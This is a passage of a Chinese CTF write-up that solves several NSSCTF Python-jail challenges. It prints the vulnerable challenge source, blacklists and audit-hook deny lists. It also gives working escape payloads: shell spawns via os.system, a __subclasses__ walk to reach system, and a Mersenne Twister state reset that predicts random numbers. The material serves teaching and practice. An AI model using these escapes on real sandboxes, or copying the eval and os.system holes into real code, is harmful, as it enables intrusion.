<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;sh&#x27;</span>)</span><br><span class="line">py</span><br><span class="line"></span><br><span class="line"><span class="comment">#It&#x27;s an challenge for jaillevel5 let&#x27;s read your flag!</span></span><br><span class="line"><span class="keyword">import</span> load_flag</span><br><span class="line"></span><br><span class="line">flag = load_flag.get_flag()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  _                _                           _       _ _ _                _ _____</span></span><br><span class="line"><span class="string"> | |              (_)                         (_)     (_) | |              | | ____|</span></span><br><span class="line"><span class="string"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | _____   _____| | |__</span></span><br><span class="line"><span class="string"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | |/ _ \ \ / / _ \ |___ \</span></span><br><span class="line"><span class="string"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | |  __/\ V /  __/ |___) |</span></span><br><span class="line"><span class="string"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_|_|\___| \_/ \___|_|____/</span></span><br><span class="line"><span class="string">              __/ |                          _/ |</span></span><br><span class="line"><span class="string">             |___/                          |__/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(WELCOME)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;It&#x27;s so easy challenge!&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Seems flag into the dir()&quot;</span>)</span><br><span class="line">    repl()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">repl</span>():</span><br><span class="line">    my_global_dict = <span class="built_in">dict</span>()</span><br><span class="line">    my_global_dict[<span class="string">&#x27;my_flag&#x27;</span>] = flag</span><br><span class="line">    input_code = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">    complie_code = <span class="built_in">compile</span>(input_code, <span class="string">&#x27;&lt;string&gt;&#x27;</span>, <span class="string">&#x27;single&#x27;</span>)</span><br><span class="line">    <span class="built_in">exec</span>(complie_code, my_global_dict)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h4 id="laKe-laKe-laKe">laKe laKe laKe</h4>
<p>you’re an python master which solved l@ke l@ke l@ke</p>
<p>So now it’s time for laKe laKe laKe</p>
<p>Good luck!!!</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#You finsih these two challenge of leak</span></span><br><span class="line"><span class="comment">#So cool</span></span><br><span class="line"><span class="comment">#Now it&#x27;s time for laKe!!!!</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> StringIO</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.addaudithook</span><br><span class="line"></span><br><span class="line">BLACKED_LIST = [<span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;open&#x27;</span>]</span><br><span class="line"></span><br><span class="line">eval_func = <span class="built_in">eval</span></span><br><span class="line">open_func = <span class="built_in">open</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> BLACKED_LIST:</span><br><span class="line">    <span class="keyword">del</span> __builtins__.__dict__[m]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_audit_hook</span>(<span class="params">event, _</span>):</span><br><span class="line">    BALCKED_EVENTS = <span class="built_in">set</span>(&#123;<span class="string">&#x27;pty.spawn&#x27;</span>, <span class="string">&#x27;os.system&#x27;</span>, <span class="string">&#x27;os.exec&#x27;</span>, <span class="string">&#x27;os.posix_spawn&#x27;</span>,<span class="string">&#x27;os.spawn&#x27;</span>,<span class="string">&#x27;subprocess.Popen&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> event <span class="keyword">in</span> BALCKED_EVENTS:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Operation banned: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(event))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">guesser</span>():</span><br><span class="line">    game_score = <span class="number">0</span></span><br><span class="line">    sys.stdout.write(<span class="string">&#x27;Can u guess the number? between 1 and 9999999999999 &gt; &#x27;</span>)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    right_guesser_question_answer = random.randint(<span class="number">1</span>, <span class="number">9999999999999</span>)</span><br><span class="line">    sys.stdout, sys.stderr, challenge_original_stdout = StringIO(), StringIO(), sys.stdout</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        input_data = eval_func(<span class="built_in">input</span>(<span class="string">&#x27;&#x27;</span>),&#123;&#125;,&#123;&#125;)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sys.stdout = challenge_original_stdout</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Seems not right! please guess it!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> game_score</span><br><span class="line">    sys.stdout = challenge_original_stdout</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> input_data == right_guesser_question_answer:</span><br><span class="line">        game_score += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> game_score</span><br><span class="line"></span><br><span class="line">WELCOME=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  _       _  __      _       _  __      _       _  __    </span></span><br><span class="line"><span class="string"> | |     | |/ /     | |     | |/ /     | |     | |/ /    </span></span><br><span class="line"><span class="string"> | | __ _| &#x27; / ___  | | __ _| &#x27; / ___  | | __ _| &#x27; / ___ </span></span><br><span class="line"><span class="string"> | |/ _` |  &lt; / _ \ | |/ _` |  &lt; / _ \ | |/ _` |  &lt; / _ \</span></span><br><span class="line"><span class="string"> | | (_| | . \  __/ | | (_| | . \  __/ | | (_| | . \  __/</span></span><br><span class="line"><span class="string"> |_|\__,_|_|\_\___| |_|\__,_|_|\_\___| |_|\__,_|_|\_\___|</span></span><br><span class="line"><span class="string">                                                         </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(WELCOME)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Welcome to my guesser game!&#x27;</span>)</span><br><span class="line">    game_score = guesser()</span><br><span class="line">    <span class="keyword">if</span> game_score == <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;you are really super guesser!!!!&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(open_func(<span class="string">&#x27;flag&#x27;</span>).read())</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Guess game end!!!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    sys.addaudithook(my_audit_hook)</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>题目引入了一个<code>sys.addaudithook</code>机制，这个机制为了给沙箱提供安全保障，题目也ban掉了大部分常用的RCE函数，也ban了<code>'compile', 'eval', 'exec', 'open'</code>这几个。</p>
<p>题目的实质不难看出这是个猜数游戏，用<code>random.randint</code>进行的一个猜数游戏。这里牵扯到一个random库的随机数生成问题。接下来来回顾一下：</p>
<p><code>random</code>库生成随机数用<code>getrandbits(32)</code>，每次产生32位序列，每组随机数为624个，然后进行一轮旋转产生一波新的624个随机数。</p>
<p>以前没有研究过的是，在这个随机库中还包含两个比较实用的函数<code>getstate()</code>和<code>setstate()</code>。通过导库之后用<code>getstate()</code>可以得到一个元组（省略号省略了624个32位随机数）：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(<span class="number">3</span>, (..., <span class="number">624</span>), <span class="literal">None</span>)</span><br></pre></td></tr></table></figure>
<p>经过简单的测试发现在这个三元组里第一和第三个元素始终是3和None，第二个元组中最后一个数其实类似于一个随机数指针，指向现在生成到的随机数，通过调用一次<code>getrandint(32)</code>之后发现改变：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(<span class="number">3</span>, (..., <span class="number">1</span>), <span class="literal">None</span>)</span><br></pre></td></tr></table></figure>
<p>同时，省略号的随机数序列也更新到了新的一组。这里我尝试用<code>setstate()</code>将当前的state转回0位置，这样我再生成的随机数和一开始的随机数是一致的：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(getrandbits(<span class="number">32</span>))</span><br><span class="line">res = getstate()</span><br><span class="line">setstate((<span class="number">3</span>, <span class="built_in">tuple</span>(<span class="built_in">list</span>(res[<span class="number">1</span>][:<span class="number">624</span>]) + [<span class="number">0</span>]), <span class="literal">None</span>))</span><br><span class="line"><span class="built_in">print</span>(getrandbits(<span class="number">32</span>))</span><br></pre></td></tr></table></figure>
<p>所以，可以通过这个方法输入一个操作，使得我们能获得当前随机数序列的状态state，并回到0位置重新生成一个题目的生成<code>random.randint(1, 9999999999999)</code>，这样我们生成的随机数和题目的随机数应该是一摸一样的，相当于”猜“出了这个随机数。</p>
<p>现在问题来了，该如何在一行代码里满足我们的这个操作呢？</p>
<p>这里不得不提到之前做题时经常发现的一个比较抽象的运算符<code>:=</code>（这玩意在py3.8引入，还有一个广泛的别名：它长得比较像海象，所以又叫<strong>海象运算符</strong>，用这个运算符可以构成<strong>赋值表达式</strong>）。</p>
<p>这个运算符可以对表达式进行赋值给运算符左边的变量，举个例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(</span><br><span class="line">    [</span><br><span class="line">        random := <span class="built_in">__import__</span>(<span class="string">&quot;random&quot;</span>),</span><br><span class="line">        random.randint(<span class="number">1</span>, <span class="number">9999999999999</span>),</span><br><span class="line">        random.setstate((<span class="number">3</span>, <span class="built_in">tuple</span>(<span class="built_in">list</span>(random.getstate()[<span class="number">1</span>][:<span class="number">624</span>]) + [<span class="number">0</span>]), <span class="literal">None</span>)),</span><br><span class="line">        random.randint(<span class="number">1</span>, <span class="number">9999999999999</span>),</span><br><span class="line">    ]</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [&lt;module &#x27;random&#x27; from &#x27;random.py&#x27;&gt;, 4180160353219, None, 4180160353219]</span></span><br></pre></td></tr></table></figure>
<p>我们用一个list来装这四个表达式，第一个表达式我们用<code>__import__</code>来导入random库，并直接赋值给random参数，相当于直接用random导入了random库<code>import random</code>，接下来由于list是从前往后运算的性质，接下来就可以利用<code>random.</code>去引用库函数了，根据上面的随机数理论，在第二个和第四个表达式中生成的两个随机数应该是一样的，所以根据这个思路，就可以用一句话去得到我们需要猜的数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[random := <span class="built_in">__import__</span>(<span class="string">&quot;random&quot;</span>), random.setstate((<span class="number">3</span>, <span class="built_in">tuple</span>(<span class="built_in">list</span>(random.getstate()[<span class="number">1</span>][:<span class="number">624</span>]) + [<span class="number">0</span>]), <span class="literal">None</span>)), random.randint(<span class="number">1</span>, <span class="number">9999999999999</span>)][-<span class="number">1</span>]</span><br></pre></td></tr></table></figure>
<h4 id="4-byte-command">4 byte command</h4>
<p>4byte to rce,So easy!!!</p>
<p>题目没有给附件，先连一下环境：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">  _                _                           _       _ _   _                _ _  _</span><br><span class="line"> | |              (_)                         (_)     (_) | | |              | | || |</span><br><span class="line"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | || |_</span><br><span class="line"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | | |/ _ \ \ / / _ \ |__   _|</span><br><span class="line"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |  | |</span><br><span class="line"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|  |_|</span><br><span class="line">              __/ |                          _/ |</span><br><span class="line">             |___/                          |__/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Welcome to the python jail</span><br><span class="line">Let&#x27;s have an beginner jail of calc</span><br><span class="line">Enter your expression and I will evaluate it for you.</span><br></pre></td></tr></table></figure>
<p>这里随便输入点东西，发现：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Enter your expression and I will evaluate it <span class="keyword">for</span> you.</span><br><span class="line">&gt; 1</span><br><span class="line">sh: 1: 1: not found</span><br></pre></td></tr></table></figure>
<p>这是直接在sh里执行了代码，这就提示我们是用的<code>os.system(input_data)</code>去执行的输入，所以我们直接输入<code>sh</code>即可拿到shell：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Enter your expression and I will evaluate it <span class="keyword">for</span> you.</span><br><span class="line">&gt; sh</span><br><span class="line">sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ cat flag</span></span><br><span class="line"><span class="string">flag=NSSCTF&#123;8b417c0a-f90f-4cfc-beb0-ee9b2573bba7&#125;</span></span><br></pre></td></tr></table></figure>
<p>源代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#4 byte to have an rce</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  _                _                           _       _ _   _                _ _  _</span></span><br><span class="line"><span class="string"> | |              (_)                         (_)     (_) | | |              | | || |</span></span><br><span class="line"><span class="string"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | || |_</span></span><br><span class="line"><span class="string"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | | |/ _ \ \ / / _ \ |__   _|</span></span><br><span class="line"><span class="string"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |  | |</span></span><br><span class="line"><span class="string"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|  |_|</span></span><br><span class="line"><span class="string">              __/ |                          _/ |</span></span><br><span class="line"><span class="string">             |___/                          |__/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(WELCOME)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the python jail&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Let&#x27;s have an beginner jail of calc&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(input_data)&gt;<span class="number">4</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Oh hacker!&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(os.system(input_data)))</span><br></pre></td></tr></table></figure>
<h4 id="calc-jail-beginner-level5-1">calc_jail_beginner_level5.1</h4>
<p>crazyman has a bad error on level5</p>
<p>now level5.1 come back</p>
<p>work your exploit!!!</p>
<p>依然是没有给附件，连一下环境：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">It&#x27;s so easy challenge!</span><br><span class="line">Seems flag into the dir()</span><br></pre></td></tr></table></figure>
<p>尝试一句话RCE：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; __import__(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;sh&#x27;</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;/home/ctf/./server.py&quot;</span>, line 42, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">  File <span class="string">&quot;/home/ctf/./server.py&quot;</span>, line 31, <span class="keyword">in</span> main</span><br><span class="line">  File <span class="string">&quot;/home/ctf/./server.py&quot;</span>, line 39, <span class="keyword">in</span> repl</span><br><span class="line">  File <span class="string">&quot;&lt;string&gt;&quot;</span>, line 1, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">NameError: name <span class="string">&#x27;__import__&#x27;</span> is not defined</span><br></pre></td></tr></table></figure>
<p>发现甚至没有<code>__import__</code>，简单试了几个，发现也没有open，继续测试：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; <span class="built_in">dir</span>()</span><br><span class="line">[<span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;my_flag&#x27;</span>]</span><br></pre></td></tr></table></figure>
<p>查看一下<code>__builtins__</code>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; __builtins__</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;/home/ctf/./server.py&quot;</span>, line 42, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">  File <span class="string">&quot;/home/ctf/./server.py&quot;</span>, line 31, <span class="keyword">in</span> main</span><br><span class="line">  File <span class="string">&quot;/home/ctf/./server.py&quot;</span>, line 39, <span class="keyword">in</span> repl</span><br><span class="line">  File <span class="string">&quot;&lt;string&gt;&quot;</span>, line 1, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">  File <span class="string">&quot;/usr/lib/python3.10/_sitebuiltins.py&quot;</span>, line 61, <span class="keyword">in</span> __repr__</span><br><span class="line">  File <span class="string">&quot;/usr/lib/python3.10/_sitebuiltins.py&quot;</span>, line 50, <span class="keyword">in</span> __setup</span><br><span class="line">NameError: name <span class="string">&#x27;open&#x27;</span> is not defined</span><br></pre></td></tr></table></figure>
<p>发现open没有无法直接得到<code>__builtins__</code>，这时想起了Show subclasses with tuple：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()</span><br></pre></td></tr></table></figure>
<p>发送之后得到了<code>__builtins__</code>。并且找到了<code> &lt;class 'os._wrap_close'&gt;</code>，就直接按照这个方法拿shell：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-<span class="number">6</span>].__init__.__globals__[<span class="string">&#x27;system&#x27;</span>](<span class="string">&#x27;sh&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>顺带获取一下源码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#It&#x27;s an challenge for jaillevel5 let&#x27;s read your flag!</span></span><br><span class="line"><span class="keyword">import</span> load_flag</span><br><span class="line"></span><br><span class="line">BLACKLIST = [<span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;open&#x27;</span>,<span class="string">&#x27;print&#x27;</span>]</span><br><span class="line"></span><br><span class="line">exec_func = <span class="built_in">exec</span></span><br><span class="line">compile_func = <span class="built_in">compile</span></span><br><span class="line">print_func = <span class="built_in">print</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> BLACKLIST:</span><br><span class="line">    <span class="keyword">del</span> __builtins__.__dict__[k]</span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> __loader__, __builtins__</span><br><span class="line"></span><br><span class="line">flag = load_flag.get_flag()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  _                _                           _       _ _ _                _ _____ __</span></span><br><span class="line"><span class="string"> | |              (_)                         (_)     (_) | |              | | ____/_ |</span></span><br><span class="line"><span class="string"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | _____   _____| | |__  | |</span></span><br><span class="line"><span class="string"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | |/ _ \ \ / / _ \ |___ \ | |</span></span><br><span class="line"><span class="string"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | |  __/\ V /  __/ |___) || |</span></span><br><span class="line"><span class="string"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_|_|\___| \_/ \___|_|____(_)_|</span></span><br><span class="line"><span class="string">              __/ |                          _/ |</span></span><br><span class="line"><span class="string">             |___/                          |__/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    print_func(WELCOME)</span><br><span class="line">    print_func(<span class="string">&quot;It&#x27;s so easy challenge!&quot;</span>)</span><br><span class="line">    print_func(<span class="string">&quot;Seems flag into the dir()&quot;</span>)</span><br><span class="line">    repl()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">repl</span>():</span><br><span class="line">    my_global_dict = <span class="built_in">dict</span>()</span><br><span class="line">    my_global_dict[<span class="string">&#x27;my_flag&#x27;</span>] = flag</span><br><span class="line">    input_code = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">    complie_code = compile_func(input_code, <span class="string">&#x27;&lt;string&gt;&#x27;</span>, <span class="string">&#x27;single&#x27;</span>)</span><br><span class="line">    exec_func(complie_code, my_global_dict)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h4 id="lak3-lak3-lak3">lak3 lak3 lak3</h4>
<p>“laKe laKe laKe have some interesting sol</p>
<p>But now lak3 lak3 lak3 is back</p>
<p>G00d luck! Hackers</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Hi hackers,lak3 comes back</span></span><br><span class="line"><span class="comment">#Have a good luck on it! :Wink:</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> StringIO</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.addaudithook</span><br><span class="line"></span><br><span class="line">BLACKED_LIST = [<span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>]</span><br><span class="line"></span><br><span class="line">eval_func = <span class="built_in">eval</span></span><br><span class="line">open_func = <span class="built_in">open</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> BLACKED_LIST:</span><br><span class="line">    <span class="keyword">del</span> __builtins__.__dict__[m]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_audit_hook</span>(<span class="params">event, _</span>):</span><br><span class="line">    BALCKED_EVENTS = <span class="built_in">set</span>(&#123;<span class="string">&#x27;pty.spawn&#x27;</span>, <span class="string">&#x27;os.system&#x27;</span>, <span class="string">&#x27;os.exec&#x27;</span>, <span class="string">&#x27;os.posix_spawn&#x27;</span>,<span class="string">&#x27;os.spawn&#x27;</span>,<span class="string">&#x27;subprocess.Popen&#x27;</span>,<span class="string">&#x27;code.__new__&#x27;</span>,<span class="string">&#x27;function.__new__&#x27;</span>,<span class="string">&#x27;cpython._PySys_ClearAuditHooks&#x27;</span>,<span class="string">&#x27;open&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> event <span class="keyword">in</span> BALCKED_EVENTS:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Operation banned: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(event))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">guesser</span>():</span><br><span class="line">    game_score = <span class="number">0</span></span><br><span class="line">    sys.stdout.write(<span class="string">&#x27;Can u guess the number? between 1 and 9999999999999 &gt; &#x27;</span>)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    right_guesser_question_answer = random.randint(<span class="number">1</span>, <span class="number">9999999999999</span>)</span><br><span class="line">    sys.stdout, sys.stderr, challenge_original_stdout = StringIO(), StringIO(), sys.stdout</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        input_data = eval_func(<span class="built_in">input</span>(<span class="string">&#x27;&#x27;</span>),&#123;&#125;,&#123;&#125;)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sys.stdout = challenge_original_stdout</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Seems not right! please guess it!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> game_score</span><br><span class="line">    sys.stdout = challenge_original_stdout</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> input_data == right_guesser_question_answer:</span><br><span class="line">        game_score += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> game_score</span><br><span class="line"></span><br><span class="line">WELCOME=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  _       _    ____    _       _    ____    _       _    ____  </span></span><br><span class="line"><span class="string"> | |     | |  |___ \  | |     | |  |___ \  | |     | |  |___ \ </span></span><br><span class="line"><span class="string"> | | __ _| | __ __) | | | __ _| | __ __) | | | __ _| | __ __) |</span></span><br><span class="line"><span class="string"> | |/ _` | |/ /|__ &lt;  | |/ _` | |/ /|__ &lt;  | |/ _` | |/ /|__ &lt; </span></span><br><span class="line"><span class="string"> | | (_| |   &lt; ___) | | | (_| |   &lt; ___) | | | (_| |   &lt; ___) |</span></span><br><span class="line"><span class="string"> |_|\__,_|_|\_\____/  |_|\__,_|_|\_\____/  |_|\__,_|_|\_\____/ </span></span><br><span class="line"><span class="string">                                                                                                                                                                       </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(WELCOME)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Welcome to my guesser game!&#x27;</span>)</span><br><span class="line">    game_score = guesser()</span><br><span class="line">    <span class="keyword">if</span> game_score == <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;you are really super guesser!!!!&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;flag&#123;fake_flag_in_local_but_really_in_The_remote&#125;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Guess game end!!!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    sys.addaudithook(my_audit_hook)</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>跟前面那个题似乎类似，因为我们的方法并没有使用任何的RCE技巧，所以尝试了一下用相同的方法，直接过了：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Can u guess the number? between 1 and 9999999999999 &gt; [random := __import__(<span class="string">&quot;random&quot;</span>), random.setstate((<span class="number">3</span>, tuple(list(random.getstate()[<span class="number">1</span>][:<span class="number">624</span>]) + [<span class="number">0</span>]), None)), random.randint(1, 9999999999999)][-1]</span><br><span class="line">you are really super guesser!!!!</span><br><span class="line">NSSCTF&#123;9df8e5bc-d76d-4d80-a437-9fccefcbd58d&#125;</span><br></pre></td></tr></table></figure>
<h4 id="tyPe-Ch-nnEl">tyPe Ch@nnEl</h4>
<p>给出了源码：</p>
